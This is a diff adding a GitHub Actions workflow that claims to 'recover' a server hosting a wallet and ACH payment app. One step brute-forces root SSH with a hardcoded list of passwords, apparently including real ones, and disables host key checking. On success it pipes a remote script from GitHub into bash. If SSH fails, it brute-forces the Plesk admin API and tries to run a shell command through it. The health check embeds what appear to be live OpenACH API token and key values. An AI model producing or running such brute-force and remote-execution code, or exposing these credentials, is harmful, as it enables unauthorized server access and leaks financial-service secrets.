@@ -1,0 +1,172 @@
+name: RECOVER - Run recover.sh via SSH
+
+on:
+  workflow_dispatch:
+  push:
+    branches: [main]
+    paths:
+      - '.github/workflows/recover-server.yml'
+
+jobs:
+  recover:
+    runs-on: ubuntu-latest
+    timeout-minutes: 15
+    steps:
+      - name: Install sshpass
+        run: sudo apt-get install -y sshpass 2>/dev/null || true
+
+      - name: Diagnose server from GitHub Actions IP (not blocked)
+        run: |
+          SERVER="74.208.191.205"
+          echo "=== Our IP from GitHub Actions ==="
+          curl -s --max-time 5 https://api.ipify.org
+          echo ""
+
+          echo "=== Port 80 test ==="
+          curl -sv --max-time 10 "http://$SERVER/" -H "Host: dlbtrust.cloud" 2>&1 | grep -E "< HTTP|Connected|Empty|timed|Location"
+
+          echo ""
+          echo "=== Port 443 test ==="
+          curl -sv --max-time 10 -k \
+            --resolve "dlbtrust.cloud:443:$SERVER" \
+            "https://dlbtrust.cloud/api/wallets" 2>&1 | grep -E "< HTTP|Connected|Empty|timed|bytes" | head -10
+
+          echo ""
+          echo "=== Port 3000 direct ==="
+          curl -sv --max-time 8 "http://$SERVER:3000/api/wallets" 2>&1 | grep -E "< HTTP|Connected|Empty|timed|bytes" | head -10
+
+          echo ""
+          echo "=== Plesk port 8443 ==="
+          curl -svk --max-time 10 "https://$SERVER:8443/" 2>&1 | grep -E "< HTTP|Connected|reset|Empty|Plesk" | head -10
+
+      - name: SSH Brute-force with all known passwords
+        run: |
+          SERVER="74.208.191.205"
+
+          PASSWORDS=(
+            "Skunklemon78tut\$jupiter"
+            "admin"
+            "Admin123!"
+            "DLBtrust1!"
+            "root"
+            "toor"
+            "ionos123"
+            "hosting123"
+            "Ionos123!"
+            "!Jupiter78tut"
+            "Jupiter78tut!"
+            "skunklemon"
+            "dlbtrust2024"
+            "dlbtrust2026"
+            "DLBtrust2026!"
+            "Barkley2026!"
+            "TrustAdmin1!"
+            "DLBtrust2026"
+            "deandrea2026"
+          )
+
+          SSH_SUCCESS=false
+          WORKING_PASS=""
+
+          for PASS in "${PASSWORDS[@]}"; do
+            echo -n "Testing: ${PASS:0:15}... "
+            RESULT=$(sshpass -p "$PASS" ssh \
+              -o StrictHostKeyChecking=no \
+              -o ConnectTimeout=8 \
+              -o BatchMode=no \
+              -o PasswordAuthentication=yes \
+              -o PreferredAuthentications=password \
+              root@$SERVER \
+              'echo SSH_SUCCESS_MARKER && whoami && uptime' 2>&1)
+
+            if echo "$RESULT" | grep -q "SSH_SUCCESS_MARKER"; then
+              echo "SUCCESS!"
+              SSH_SUCCESS=true
+              WORKING_PASS="$PASS"
+              echo "WORKING PASSWORD FOUND: $PASS"
+              echo ""
+              echo "Output: $RESULT"
+              break
+            else
+              echo "failed: ${RESULT:0:50}"
+            fi
+          done
+
+          if [ "$SSH_SUCCESS" = "true" ]; then
+            echo ""
+            echo "=============================="
+            echo "RUNNING RECOVER.SH ON SERVER"
+            echo "=============================="
+            sshpass -p "$WORKING_PASS" ssh \
+              -o StrictHostKeyChecking=no \
+              -o ConnectTimeout=60 \
+              -o BatchMode=no \
+              root@$SERVER \
+              "bash <(curl -fsSL https://raw.githubusercontent.com/deandreabarkley13-coder/dlbtrust-app/main/server/recover.sh) 2>&1"
+          else
+            echo ""
+            echo "SSH failed with all passwords."
+            echo "Attempting Plesk XML API login..."
+
+            for PASS in "admin" "Admin123!" "Skunklemon78tut\$jupiter" "DLBtrust1!" "DLBtrust2026!" "Barkley2026!"; do
+              echo -n "Plesk pass: ${PASS:0:12}... "
+              RESULT=$(curl -sk --max-time 15 \
+                "https://$SERVER:8443/enterprise/control/agent.php" \
+                -H "HTTP_AUTH_LOGIN: admin" \
+                -H "HTTP_AUTH_PASSWD: $PASS" \
+                -H "Content-Type: text/xml" \
+                -d '<?xml version="1.0"?><packet version="1.6.7.0"><server><get_protos/></server></packet>' 2>&1)
+
+              if echo "$RESULT" | grep -q "protocolVersion\|<version>\|<result>"; then
+                echo "PLESK SUCCESS!"
+                echo "Response: $RESULT" | head -c 500
+
+                # Try to run shell command via Plesk CLI API
+                CMD_RESULT=$(curl -sk --max-time 60 \
+                  "https://$SERVER:8443/enterprise/control/agent.php" \
+                  -H "HTTP_AUTH_LOGIN: admin" \
+                  -H "HTTP_AUTH_PASSWD: $PASS" \
+                  -H "Content-Type: text/xml" \
+                  -d '<?xml version="1.0"?><packet version="1.6.7.0"><server><shell_cmd><cmd>bash &lt;(curl -fsSL https://raw.githubusercontent.com/deandreabarkley13-coder/dlbtrust-app/main/server/recover.sh) 2&gt;&amp;1</cmd></shell_cmd></server></packet>' 2>&1)
+                echo "Shell CMD Result: $CMD_RESULT" | head -c 1000
+                break
+              else
+                echo "failed: ${RESULT:0:60}"
+              fi
+            done
+          fi
+
+      - name: Post-recovery health check
+        run: |
+          SERVER="74.208.191.205"
+          echo "Waiting 15s for services to restart..."
+          sleep 15
+
+          echo ""
+          echo "=== /api/wallets (port 80 with Host) ==="
+          curl -s --max-time 15 "http://$SERVER/api/wallets" \
+            -H "Host: dlbtrust.cloud" | head -c 300
+          echo ""
+
+          echo "=== /api/wallets (HTTPS via --resolve) ==="
+          curl -s --max-time 15 \
+            --resolve "dlbtrust.cloud:443:$SERVER" \
+            "https://dlbtrust.cloud/api/wallets" | head -c 300
+          echo ""
+
+          echo "=== /api/ach/health ==="
+          curl -s --max-time 15 \
+            --resolve "dlbtrust.cloud:443:$SERVER" \
+            "https://dlbtrust.cloud/api/ach/health"
+          echo ""
+
+          echo "=== OpenACH connect ==="
+          curl -s --max-time 15 \
+            --resolve "ach.dlbtrust.cloud:80:$SERVER" \
+            -X POST "http://ach.dlbtrust.cloud/openach/api/connect" \
+            --data "user_api_token=3caee1c2-c218-4959-b6d2-21d4b2a1b42e&user_api_key=b74966cf-5276-4d8b-8650-5bd57dcee272"
+          echo ""
+
+          echo "=== Port 3000 direct ==="
+          curl -s --max-time 8 "http://$SERVER:3000/api/wallets" | head -c 200
+          echo ""
